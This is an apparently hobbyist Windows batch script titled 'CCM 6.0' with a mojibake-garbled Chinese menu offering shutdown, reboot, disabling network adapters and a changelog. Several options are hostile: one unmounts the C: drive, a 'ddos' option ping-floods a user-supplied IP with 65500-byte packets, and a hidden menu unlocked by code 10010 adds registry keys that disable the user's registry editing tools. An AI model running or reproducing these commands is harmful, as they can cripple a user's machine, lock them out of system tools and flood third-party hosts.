@echo off
cls
goto shouye1
:mountvol
cls
mountvol c:\ /d
pause
:shutdown
cls
shutdown -s -t 1
pause
:reboot
cls
shutdown -r -t 1
pause
:offinternet
cls
netsh interface set interface "��̫��" disabled
netsh interface set interface "����" disabled
netsh interface set interface "WLAN" disabled
netsh interface set interface "WIFI" disabled
pause
:shouye1
cls
title CCM 6.0 �����Ǳ���ʱ�� %date%
color 6F
echo                                                            ѡ��
echo        1.������ 2.������ 3.ʵ����  4.�ػ� 5.����c�� 6.������־ 7.�����ѹ 8.�˳� 9.�ڲ����
set /p a=��ѡ�� 
if /i '%a%'=='1' goto cheup
if /i '%a%'=='2' goto offinternet
if /i '%a%'=='3' goto firstpage
if /i '%a%'=='4' goto shutdown
if /i '%a%'=='5' goto mountvol
if /i '%a%'=='6' goto updatelog
if /i '%a%'=='7' goto ddos
if /i '%a%'=='8' goto editor
if /i '%a%'=='9' goto testing
goto shouye1
:cheup
cls
start http:\\batexe.ysepan.com
goto shouye1 
:updatelog
cls
echo 2.0��־
echo 1.0ʺɽ���� ȫ���ع�
echo ʹ�����߼���Ч������50%
echo 3.0��־
echo ɵ��ʺɽ�������д����ȥ 3.0�����Ż�
echo 4.0��־ ���Ƹ�ΪCCM(CloudComputerManager)
echo 5.0��־ �������1.0����ȫ���ع����Ƴ�һЩ���׵���bug�Ĺ���
echo 6.0��־ȱʧ
echo 7.0�޸�һЩ�ײ�bug
echo 7.22.8.25Beta���ڲ����
pause
goto shouye1
:ddos
cls
set /p q=����ip����ַ:
:dddstart
cls
ping %q% -t -l 65500
:firstpage
echo ���ޣ������������
pause
goto shouye1
:editor
exit
:testing
cls
echo Please Type Code Here To Unlock
set /p edf=
if /i '%edf%'=='10010' goto tmonitor
echo �����
pause
exit
:tmonitor
cls
echo 1.���ܼ��� 2.����ɱ�� 
set /p asdsdsdsd=��ѡ�� 
if /i '%asdsdsdsd%'=='1' goto smoitor
if /i '%asdsdsdsd%'=='2' goto killerqueen
:smoitor
::fbxwcnm������д��
resmon
:killerqueen
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000001 /
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools/tREG_DWORD/d1/f